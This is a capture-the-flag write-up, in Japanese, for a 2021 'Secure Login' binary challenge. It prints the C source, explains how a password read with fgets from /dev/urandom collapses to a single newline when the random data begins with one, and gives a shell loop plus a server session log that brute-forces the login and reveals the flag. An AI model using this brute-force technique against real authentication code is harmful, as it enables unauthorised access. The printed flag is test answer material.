# Secure Login:Binary:50pts
My login is, potentially, and I don't say this lightly, if you know me you know that's the truth, it's truly, and no this isn't snake oil, this is, no joke, the most [secure login service](login) in the world ([source](login.c)).  
Try to hack me at `/problems/2021/secure_login` on the shell server.  
Hint  
Look into how strcmp works and how that fits in with what /dev/urandom returns.  

# Solution
安全なログインらしい。  
配布されたソースを見ると以下のようであった。  
```C:login.c
#include <stdio.h>

char password[128];

void generate_password() {
	FILE *file = fopen("/dev/urandom","r");
	fgets(password, 128, file);
	fclose(file);
}

void main() {
	puts("Welcome to my ultra secure login service!");

	// no way they can guess my password if it's random!
	generate_password();

	char input[128];
	printf("Enter the password: ");
	fgets(input, 128, stdin);

	if (strcmp(input, password) == 0) {
		char flag[128];

		FILE *file = fopen("flag.txt","r");
		if (!file) {
		    puts("Error: missing flag.txt.");
		    exit(1);
		}

		fgets(flag, 128, file);
		puts(flag);
	} else {
		puts("Wrong!");
	}
}
```
入力とパスワードが一致すればよいが、パスワードは/dev/urandomを読み取っている。  
乱数を予測するなどということは難しいので、他の突破法を考える。  
fgetsは改行コードを読み取るとその後に\0を付加して終了する。  
つまり/dev/urandomが改行から始まっている場合、passwordは\n\0の改行のみとなる。  
以下のflag.shで改行を入力し続ければよい。  
```shell:flag.sh
while [ ! "`echo $result | grep 'actf'`" ]
do
    result=$(echo -e "\n" | ./login)
done
echo $result
```
以下のように問題サーバで実行する。  
```bash
$ ssh team7901@shell.actf.co
team7901@shell.actf.co's password:
Welcome to the
                       _                            _    __
   ()                 | |                          | |  / _|
  __ _ _ __   __ _ ___| |_ _ __ ___  _ __ ___   ___| |_| |_
 / _` | '_ \ / _` / __| __| '__/ _ \| '_ ` _ \ / __| __|  _|
| (_| | | | | (_| \__ \ |_| | | (_) | | | | | | (__| |_| |
 \__,_|_| |_|\__, |___/\__|_|  \___/|_| |_| |_|\___|\__|_|
              __/ |
             |___/

shell server!

*==============================================================================*
*  Please be respectful of other users. Abuse may result in disqualification.  *
*Data can be wiped at ANY TIME with NO WARNING. Keep backups of important data!*
*==============================================================================*
Last login: Tue Apr  6 15:20:21 2021 from 127.0.0.1
team7901@actf:~$ cd /problems/2021/secure_login
team7901@actf:/problems/2021/secure_login$ while [ ! "`echo $result | grep 'actf'`" ];do    result=$(echo -e "\n" | ./login);done;echo $result;
Welcome to my ultra secure login service! Enter the password: actf{if_youre_reading_this_ive_been_hacked}
```
flagが得られた。  

## actf{if_youre_reading_this_ive_been_hacked}